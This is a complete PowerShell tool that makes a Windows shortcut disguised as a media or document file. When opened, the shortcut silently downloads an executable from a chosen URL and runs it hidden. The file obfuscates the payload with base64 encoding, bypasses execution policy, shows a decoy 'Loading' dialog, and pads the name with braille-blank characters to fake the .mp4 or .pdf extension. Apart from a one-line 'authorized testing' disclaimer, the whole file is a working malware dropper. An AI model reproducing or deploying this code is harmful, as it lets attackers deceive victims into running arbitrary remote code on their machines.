<#
.SYNOPSIS
    Creates a disguised Windows shortcut (.lnk) that downloads and executes a remote payload.
    WARNING: This script can be used maliciously. Use only for authorized testing or research.
#>

function Read-ValidatedInput {
    param(
        [string]$Prompt,
        [scriptblock]$Validator,
        [string]$ErrorMessage,
        [switch]$AllowEmpty
    )
    do {
        $value = Read-Host $Prompt
        if ($AllowEmpty -and [string]::IsNullOrWhiteSpace($value)) { return "" }
        if (& $Validator $value) { return $value.Trim() }
        Write-Host $ErrorMessage -ForegroundColor Red
    } while ($true)
}


$CurrentDir = (Get-Location).Path

$url = Read-ValidatedInput -Prompt "Enter the download URL (required)" `
    -Validator { param($v) -not [string]::IsNullOrWhiteSpace($v) -and $v -match '^https?://' } `
    -ErrorMessage "URL cannot be empty and must start with http:// or https://"

$baseName = Read-Host "Enter shortcut base name (optional, press Enter for 'video')"
if ([string]::IsNullOrWhiteSpace($baseName)) { $baseName = "video" }

$spoofChoice = Read-Host "Spoof extension with braille spaces? (y/n, default n)"
$doSpoof = $spoofChoice -match '^(y|yes)$'

$fakeExt = ""
if ($doSpoof) {
    $fakeExt = Read-ValidatedInput -Prompt "Enter fake extension (e.g. mp4, pdf, mp3)" `
        -Validator { param($v) -not [string]::IsNullOrWhiteSpace($v.Trim().TrimStart('.')) } `
        -ErrorMessage "Fake extension cannot be empty."
    $fakeExt = $fakeExt.TrimStart('.').ToLower()
}

$CustomIconPath = Join-Path $CurrentDir "image.ico"
if (Test-Path $CustomIconPath) {
    $IconLocation = $CustomIconPath
    $IconDescription = "Custom ./image.ico"
} else {
    $IconLocation = "%SystemRoot%\System32\shell32.dll,0"
    $IconDescription = "Default blank document icon (image.ico not found)"
}

$RandomName = (-join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})) + ".exe"  
$TempFilePath = Join-Path $env:TEMP $RandomName

$PayloadCommand = @"
`$ProgressPreference = 'SilentlyContinue';
try {
    Invoke-WebRequest -Uri '$url' -OutFile '$TempFilePath' -UseBasicParsing -ErrorAction Stop;
    if (Test-Path '$TempFilePath') {
        Start-Process '$TempFilePath' -WindowStyle Hidden;
        Start-Sleep -Seconds 2;
        Add-Type -AssemblyName PresentationFramework;
        [System.Windows.MessageBox]::Show('Starting... Please wait.','Loading','OK','Information');
    }
} catch { }
"@

$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadCommand))
$Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $EncodedPayload"

$InitialShortcutName = "$baseName.lnk"
$InitialShortcutPath = Join-Path $CurrentDir $InitialShortcutName

try {
    $Shell = New-Object -ComObject WScript.Shell
    $Shortcut = $Shell.CreateShortcut($InitialShortcutPath)
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = $Arguments
    $Shortcut.WorkingDirectory = "$env:SystemRoot\System32"
    $Shortcut.Description = "Media file"
    $Shortcut.WindowStyle = 7 
    $Shortcut.IconLocation = $IconLocation
    $Shortcut.Save()

    if ($doSpoof) {
        $BrailleBlank = [char]0x2800
        $Padding = [string]::new($BrailleBlank, 150) 

        $SpoofedDisplayName = "$baseName.$fakeExt$Padding" + "t"  
        $FinalShortcutName = "$SpoofedDisplayName.lnk"
        $FinalShortcutPath = Join-Path $CurrentDir $FinalShortcutName

        Rename-Item -LiteralPath $InitialShortcutPath -NewName $FinalShortcutName -ErrorAction Stop

        Write-Host "`nSUCCESS! Spoofed shortcut created" -ForegroundColor Green
        Write-Host "Visible name   : $baseName.$fakeExt t" -ForegroundColor Cyan
        Write-Host "Actual file    : $FinalShortcutName" -ForegroundColor Cyan
        Write-Host "Full path      : $FinalShortcutPath" -ForegroundColor Cyan
    } else {
        $FinalShortcutPath = $InitialShortcutPath
        Write-Host "`nSUCCESS! Shortcut created (no spoofing)" -ForegroundColor Green
        Write-Host "File           : $InitialShortcutPath" -ForegroundColor Cyan
    }

    Write-Host "Icon           : $IconDescription" -ForegroundColor Cyan
    Write-Host "Payload URL    : $url" -ForegroundColor Yellow
    Write-Host "Temp executable: $RandomName (in %TEMP%)" -ForegroundColor Yellow
    Write-Host ""
}
catch {
    Write-Host "`nERROR: Failed to create or rename shortcut." -ForegroundColor Red
    Write-Host "Details: $($_.Exception.Message)" -ForegroundColor Red
    if (Test-Path $InitialShortcutPath) {
        Write-Host "Partial shortcut created at: $InitialShortcutPath" -ForegroundColor Yellow
        Write-Host "You can delete it manually if needed." -ForegroundColor Yellow
    }
    exit 1
}
